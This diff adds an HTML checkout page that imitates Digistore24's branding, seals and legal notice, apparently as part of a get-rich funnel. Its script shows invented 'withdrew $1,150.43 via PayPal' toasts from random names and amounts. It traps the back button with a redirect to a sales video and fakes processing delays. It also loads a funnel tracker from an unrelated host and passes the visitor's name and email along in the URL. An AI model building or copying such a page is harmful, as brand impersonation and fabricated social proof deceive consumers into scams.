@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
+<title>Checkout — Digistore24</title>
+<meta name="referrer" content="no-referrer"/>
+<link rel="icon" href="/favicon-64.png"/>
+<script src="https://click-charm-73.lovable.app/funnel.js?w=976e24b0-6a4d-4dd1-90af-7b0e1f18cfdd&f=9af23cbc-93d1-4812-9666-84637488d471" data-auto="true" defer></script>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;background:#f4f5f7;color:#24272b;-webkit-font-smoothing:antialiased;min-height:100vh}
+a{color:#3b5998;text-decoration:none}a:hover{text-decoration:underline}
+
+.ds-header{background:#fff;border-bottom:1px solid #e5e7eb;padding:16px 20px}
+.ds-header-inner{max-width:720px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px}
+.ds-logo-area{display:flex;align-items:center;gap:8px}
+.ds-logo-area .checkout-by{font-size:11px;color:#e74c3c;font-weight:600;letter-spacing:.3px}
+.ds-logo-area .ds-logo{height:32px}
+.ds-badges-row{display:flex;align-items:center;gap:18px;flex-wrap:wrap}
+.ds-badge{display:flex;align-items:center;gap:5px;font-size:12px;font-weight:600;color:#3a3f47}
+.ds-badge svg{width:16px;height:16px;color:#3b5998}
+
+.ds-progress{background:linear-gradient(135deg,#2b3a67,#3b5998);padding:12px 20px}
+.ds-progress-inner{max-width:720px;margin:0 auto;display:flex;align-items:center;justify-content:center;gap:12px}
+.ds-step{display:flex;align-items:center;gap:6px;color:rgba(255,255,255,.6);font-size:13px;font-weight:600}
+.ds-step.done{color:#fff}
+.ds-step .check{width:22px;height:22px;background:#4caf50;border-radius:50%;display:flex;align-items:center;justify-content:center}
+.ds-step .check svg{width:13px;height:13px;color:#fff}
+.ds-arrow{color:rgba(255,255,255,.4);font-size:18px;margin:0 4px}
+
+.ds-main{max-width:720px;margin:24px auto;padding:0 16px}
+.ds-card{background:#fff;border-radius:8px;border:1px solid #e5e7eb;box-shadow:0 1px 4px rgba(0,0,0,.06)}
+.ds-card-body{padding:24px 28px}
+
+.ds-section-title{font-size:13px;font-weight:700;letter-spacing:.8px;text-transform:uppercase;color:#24272b;margin-bottom:16px}
+
+.ds-form-row{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.ds-form-group{margin-bottom:14px}
+.ds-form-group label{display:block;font-size:12.5px;font-weight:500;color:#4a4f57;margin-bottom:5px}
+.ds-form-group label .req{color:#e74c3c}
+.ds-input{width:100%;height:44px;border:1px solid #c8ccd1;border-radius:6px;padding:0 12px;font-size:14px;color:#24272b;background:#fff;outline:none;transition:border-color .2s,box-shadow .2s}
+.ds-input:focus{border-color:#3b5998;box-shadow:0 0 0 3px rgba(59,89,152,.12)}
+.ds-select{appearance:none;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%236b7280' stroke-width='1.5' fill='none'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 12px center;padding-right:32px}
+
+.ds-payment-title{font-size:13px;font-weight:700;letter-spacing:.8px;text-transform:uppercase;color:#24272b;margin:20px 0 12px}
+
+.ds-payment-tabs{display:flex;border:2px solid #e5e7eb;border-radius:8px;overflow:hidden}
+.ds-tab{flex:1;display:flex;align-items:center;justify-content:center;gap:8px;padding:14px 12px;cursor:pointer;background:#fff;border:none;font-size:14px;font-weight:600;color:#4a4f57;transition:all .2s}
+.ds-tab.active{border:2px solid #3b5998;border-radius:6px;margin:-2px;z-index:1;background:#f8faff}
+.ds-tab img{height:22px}
+.ds-tab .card-icons{display:flex;align-items:center;gap:4px}
+.ds-tab .card-icons img{height:20px}
+
+.ds-terms{text-align:center;font-size:12px;color:#6b7280;margin:18px 0 14px}
+
+.ds-checkout-btn{display:block;width:260px;margin:0 auto;padding:14px 0;background:#3b5998;color:#fff;border:none;border-radius:6px;font-size:15px;font-weight:700;letter-spacing:.5px;cursor:pointer;transition:background .2s,transform .1s;text-transform:uppercase}
+.ds-checkout-btn:hover{background:#344e86}
+.ds-checkout-btn:active{transform:scale(.98)}
+.ds-checkout-btn:disabled{background:#b0b8c4;cursor:not-allowed}
+
+.ds-seals{display:flex;align-items:center;justify-content:center;gap:16px;margin:20px 0 8px;flex-wrap:wrap}
+.ds-seals img{height:44px}
+
+.ds-notice{padding:20px 28px;border-top:1px solid #e5e7eb}
+.ds-notice-title{font-size:12px;font-weight:700;letter-spacing:.5px;text-transform:uppercase;color:#3b5998;margin-bottom:12px}
+.ds-notice ul{list-style:disc;padding-left:20px;font-size:12px;line-height:1.7;color:#4a4f57}
+.ds-notice ul a{color:#3b5998}
+
+.ds-footer{max-width:720px;margin:24px auto 40px;padding:0 16px;text-align:center}
+.ds-footer-brand{display:flex;align-items:center;justify-content:center;gap:8px;font-size:12px;color:#6b7280;font-weight:600;letter-spacing:.5px;text-transform:uppercase}
+.ds-footer-brand img{height:18px;opacity:.6}
+.ds-footer-links{margin-top:10px;font-size:12px;color:#6b7280}
+.ds-footer-links a{color:#6b7280;margin:0 6px}
+.ds-footer-links a:hover{color:#3b5998}
+.ds-footer-copy{margin-top:6px;font-size:11px;color:#9ca3af}
+
+.ds-spinner{animation:dsSpin .7s linear infinite;display:inline-block;margin-right:6px}
+@keyframes dsSpin{to{transform:rotate(360deg)}}
+
+@keyframes dsSlideIn{from{transform:translateY(-20px);opacity:0}to{transform:translateY(0);opacity:1}}
+@keyframes dsSlideOut{from{transform:translateY(0);opacity:1}to{transform:translateY(-20px);opacity:0}}
+.toast-in{animation:dsSlideIn .4s ease-out forwards}
+.toast-out{animation:dsSlideOut .4s ease-in forwards}
+
+@media(max-width:600px){
+  .ds-header-inner{flex-direction:column;align-items:flex-start}
+  .ds-badges-row{display:none}
+  .ds-form-row{grid-template-columns:1fr}
+  .ds-card-body{padding:20px 16px}
+  .ds-notice{padding:16px}
+  .ds-checkout-btn{width:100%}
+  .ds-seals img{height:36px}
+}
+</style>
+</head>
+<body data-funnel-view="coleta_de_nome1">
+
+<!-- Toast container -->
+<div id="toasts" class="pointer-events-none" style="position:fixed;top:12px;left:0;right:0;z-index:9999;display:flex;flex-direction:column;gap:8px;align-items:center;padding:0 12px"></div>
+
+<!-- HEADER -->
+<header class="ds-header">
+  <div class="ds-header-inner">
+    <div class="ds-logo-area">
+      <div>
+        <span class="checkout-by">Checkout by</span>
+        <img src="https://digistore24.com/pb/file/page_builder_images/d120778c05d0962e4e52a524882166d25c26126d/orderform-assets/en/assets/brand/digistore/logo/logo_wide.svg" alt="Digistore24" class="ds-logo"/>
+      </div>
+    </div>
+    <div class="ds-badges-row">
+      <span class="ds-badge">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+        Secure SSL connection
+      </span>
+      <span class="ds-badge">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg>
+        Quick Checkout
+      </span>
+      <span class="ds-badge">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/><path d="m9 12 2 2 4-4"/></svg>
+        Trusted support
+      </span>
+    </div>
+  </div>
+</header>
+
+<!-- PROGRESS BAR -->
+<div class="ds-progress">
+  <div class="ds-progress-inner">
+    <span class="ds-step done">
+      <span class="check"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg></span>
+      Contact
+    </span>
+    <span class="ds-arrow">&#10230;</span>
+    <span class="ds-step done">
+      <span class="check"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg></span>
+      Payment
+    </span>
+    <span class="ds-arrow">&#10230;</span>
+    <span class="ds-step">Done</span>
+  </div>
+</div>
+
+<!-- MAIN CARD -->
+<div class="ds-main">
+  <div class="ds-card">
+    <div class="ds-card-body">
+
+      <h2 class="ds-section-title">ADDRESS</h2>
+
+      <form id="payForm" onsubmit="return handleSubmit(event)" data-funnel-submit="elegibilidade1">
+        <div class="ds-form-row">
+          <div class="ds-form-group">
+            <label for="ds-first">First name<span class="req">*</span></label>
+            <input id="ds-first" name="first_name" type="text" autocomplete="given-name" required class="ds-input" oninput="checkFields()"/>
+          </div>
+          <div class="ds-form-group">
+            <label for="ds-last">Last name<span class="req">*</span></label>
+            <input id="ds-last" name="last_name" type="text" autocomplete="family-name" required class="ds-input" oninput="checkFields()"/>
+          </div>
+        </div>
+
+        <div class="ds-form-group">
+          <label for="ds-email">Email address<span class="req">*</span></label>
+          <input id="ds-email" name="email" type="email" autocomplete="email" required class="ds-input" oninput="checkFields()"/>
+        </div>
+
+        <div class="ds-form-group">
+          <label for="ds-country">Country<span class="req">*</span></label>
+          <select id="ds-country" name="country" class="ds-input ds-select" oninput="checkFields()">
+            <option value="">Select country</option>
+            <option value="US">United States</option>
+            <option value="BR" selected>Brazil</option>
+            <option value="GB">United Kingdom</option>
+            <option value="CA">Canada</option>
+            <option value="AU">Australia</option>
+            <option value="DE">Germany</option>
+            <option value="FR">France</option>
+            <option value="IN">India</option>
+            <option value="MX">Mexico</option>
+            <option value="PT">Portugal</option>
+            <option value="ES">Spain</option>
+            <option value="IT">Italy</option>
+            <option value="NL">Netherlands</option>
+            <option value="JP">Japan</option>
+            <option value="KR">South Korea</option>
+            <option value="PH">Philippines</option>
+            <option value="NG">Nigeria</option>
+            <option value="ZA">South Africa</option>
+            <option value="CO">Colombia</option>
+            <option value="AR">Argentina</option>
+            <option value="CL">Chile</option>
+            <option value="PE">Peru</option>
+            <option value="OTHER">Other</option>
+          </select>
+        </div>
+
+        <div class="ds-form-group" style="max-width:220px">
+          <label for="ds-zip">ZIP Code<span class="req">*</span></label>
+          <input id="ds-zip" name="zip" type="text" autocomplete="postal-code" class="ds-input" placeholder="ZIP Code*" oninput="checkFields()"/>
+        </div>
+
+        <!-- PAYMENT METHODS -->
+        <h3 class="ds-payment-title">PAYMENT METHODS</h3>
+        <div class="ds-payment-tabs">
+          <button type="button" class="ds-tab active" id="tab-apple" onclick="selectTab('apple')">
+            <img src="https://www.checkout-ds24.com/pb/webinc/d120778c/images/payment/json/icon/new_icons/dark/primer_pay_apple.svg" alt="Apple Pay"/>
+          </button>
+          <button type="button" class="ds-tab" id="tab-card" onclick="selectTab('card')">
+            <span class="card-icons">
+              <img src="https://www.checkout-ds24.com/pb/webinc/d120778c/images/payment/json/icon/new_icons/dark/creditcard-long_us.svg" alt="Credit/Debit Card" style="height:24px"/>
+            </span>
+          </button>
+        </div>
+
+        <!-- Terms -->
+        <p class="ds-terms">By clicking "Checkout Now" I agree to Digistore24's <a href="#">Terms</a> and <a href="#">Privacy Policy</a>.</p>
+
+        <!-- Submit -->
+        <button id="submitBtn" type="submit" class="ds-checkout-btn" disabled>CHECKOUT NOW</button>
+      </form>
+
+      <!-- Seals -->
+      <div class="ds-seals">
+        <img src="https://digistore24.com/pb/file/page_builder_images/d120778c05d0962e4e52a524882166d25c26126d/orderform-assets/en/assets/siegel/ssl_secured_dark.svg" alt="SSL Secured"/>
+        <img src="/images/seal-secure-payments.png" alt="Secure Payments" onerror="this.style.display='none'"/>
+        <img src="https://digistore24.com/pb/file/page_builder_images/d120778c05d0962e4e52a524882166d25c26126d/orderform-assets/en/assets/siegel/virus_scanned_dark.svg" alt="Virus Scan Guaranteed"/>
+      </div>
+
+    </div>
+
+    <!-- IMPORTANT NOTICE -->
+    <div class="ds-notice">
+      <h4 class="ds-notice-title">IMPORTANT NOTICE</h4>
+      <ul>
+        <li>Download products can be downloaded up to 50 times within 12 months from payment.</li>
+        <li>Distributor and contractual partner is Digistore24 Inc., 360 Central Avenue, Suite 800, St. Petersburg, FL 33701, United States. Customer service: Email <a href="#">helpdesk@digistore24.com</a> / phone + 1-800-356-7947</li>
+        <li>By sending the order you acknowledge the <a href="#">Terms and Conditions</a> as well as the <a href="#">Privacy Policy</a> of Digistore24 as part of a closed sales contract and acknowledge that you understand the <a href="#">revocation right for consumers</a>.</li>
+        <li>Digital products will be delivered right after payment receipt. Physical goods will be delivered within 7 days after payment receipt.</li>
+        <li>If you have any problems contacting the author of this product and if you have any questions, please feel free to contact us at: <a href="#">helpdesk@digistore24.com</a></li>
+        <li>After the successful purchase, you will be directed to the download page, and you will get immediate access to your product.</li>
+        <li>The author of the purchased product/software or the seminar organizer may contact you via email.</li>
+        <li>By clicking the "Buy Now" button above, you direct Digistore24 Inc. to send your contact details and order information to the third party whose products you purchase through this page. You acknowledge and agree that Digistore24 Inc. does not control how this party uses your information.</li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <div class="ds-footer">
+    <div class="ds-footer-brand">
+      BUY SECURELY FROM
+      <img src="https://digistore24.com/pb/file/page_builder_images/d120778c05d0962e4e52a524882166d25c26126d/orderform-assets/en/assets/brand/digistore/logo/logo_wide.svg" alt="Digistore24"/>
+    </div>
+    <div class="ds-footer-links">
+      <a href="#">Terms &amp; Conditions</a> |
+      <a href="#">Legal Notice</a> |
+      <a href="#">Privacy Policy</a> |
+      <a href="#">Contact Us</a>
+    </div>
+    <div class="ds-footer-copy">&copy; 2026 Digistore24 Inc., all rights reserved</div>
+  </div>
+</div>
+
+<script>
+(function(){
+var P=window.location.search;
+var params=new URLSearchParams(P);
+
+// Auto-fill from URL params
+var fn=params.get('first_name')||'';
+var ln=params.get('last_name')||'';
+var em=params.get('email')||'';
+if(fn)document.getElementById('ds-first').value=fn;
+if(ln)document.getElementById('ds-last').value=ln;
+if(em)document.getElementById('ds-email').value=em;
+
+// Auto-detect country from geo
+fetch('/api/geo-country').then(function(r){return r.json()}).then(function(d){
+  if(d.countryCode){
+    var sel=document.getElementById('ds-country');
+    for(var i=0;i<sel.options.length;i++){
+      if(sel.options[i].value===d.countryCode){sel.selectedIndex=i;break}
+    }
+  }
+}).catch(function(){});
+
+checkFields();
+
+window.selectTab=function(tab){
+  document.getElementById('tab-apple').classList.toggle('active',tab==='apple');
+  document.getElementById('tab-card').classList.toggle('active',tab==='card');
+};
+
+window.checkFields=function(){
+  var fn=document.getElementById('ds-first').value.trim();
+  var ln=document.getElementById('ds-last').value.trim();
+  var em=document.getElementById('ds-email').value.trim();
+  var btn=document.getElementById('submitBtn');
+  if(fn&&ln&&em){btn.disabled=false}else{btn.disabled=true}
+};
+
+window.handleSubmit=function(e){
+  e.preventDefault();
+  var btn=document.getElementById('submitBtn');
+  btn.disabled=true;
+  btn.innerHTML='<svg class="ds-spinner" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><circle cx="12" cy="12" r="10" stroke-opacity=".3"/><path d="M12 2a10 10 0 0 1 10 10"/></svg>PROCESSING...';
+
+  setTimeout(function(){
+    btn.innerHTML='<svg class="ds-spinner" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><circle cx="12" cy="12" r="10" stroke-opacity=".3"/><path d="M12 2a10 10 0 0 1 10 10"/></svg>CONNECTING...';
+  },2000);
+
+  setTimeout(function(){
+    if(window.trkFunnel)trkFunnel.step('recibo1');
+    var p=new URLSearchParams(window.location.search);
+    // pass form values into params for checkout
+    p.set('first_name',document.getElementById('ds-first').value.trim());
+    p.set('last_name',document.getElementById('ds-last').value.trim());
+    p.set('email',document.getElementById('ds-email').value.trim());
+    window.location.href='/checkout?'+p.toString();
+  },3500);
+
+  return false;
+};
+
+// Withdrawal toasts
+var NAMES=['Emma W.','James K.','Sophia R.','Lucas M.','Olivia T.','Noah B.','Ava C.','Liam P.','Mia D.','Ethan F.','Isabella G.','Mason H.','Charlotte J.','Logan S.','Amelia V.','Alexander N.','Harper L.','Benjamin Q.','Evelyn U.','Daniel Z.'];
+var AMOUNTS=['$347.00','$1,150.43','$697.00','$450.00','$892.50','$1,044.00','$523.00','$780.00','$1,150.43','$347.00'];
+var container=document.getElementById('toasts');
+
+function showToast(){
+  var name=NAMES[Math.floor(Math.random()*NAMES.length)];
+  var amount=AMOUNTS[Math.floor(Math.random()*AMOUNTS.length)];
+  var mins=Math.floor(Math.random()*12)+1;
+  var t=document.createElement('div');
+  t.className='toast-in';
+  t.style.cssText='display:flex;align-items:center;gap:10px;background:rgba(255,255,255,.97);border:1px solid #e5e7eb;border-radius:12px;padding:10px 14px;max-width:380px;width:100%;box-shadow:0 4px 16px rgba(0,0,0,.12);backdrop-filter:blur(4px)';
+  t.innerHTML='<img src="/robot-money-logo.png" alt="" style="width:32px;height:32px;border-radius:6px;flex-shrink:0"/><div style="flex:1;min-width:0"><p style="font-size:11px;font-weight:700;color:#24272b;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">'+name+' withdrew '+amount+'</p><p style="font-size:10px;color:#6b7280">'+mins+' min ago via PayPal</p></div>';
+  container.prepend(t);
+  setTimeout(function(){t.className='toast-out';setTimeout(function(){t.remove()},400)},4000);
+}
+setTimeout(showToast,3000);
+setInterval(function(){setTimeout(showToast,Math.random()*4000)},8000);
+
+// Back redirect
+history.pushState(null,'',location.href);
+window.addEventListener('popstate',function(){history.pushState(null,'',location.href);window.location.href='/vsl'+P});
+})();
+</script>
+</body>
+</html>
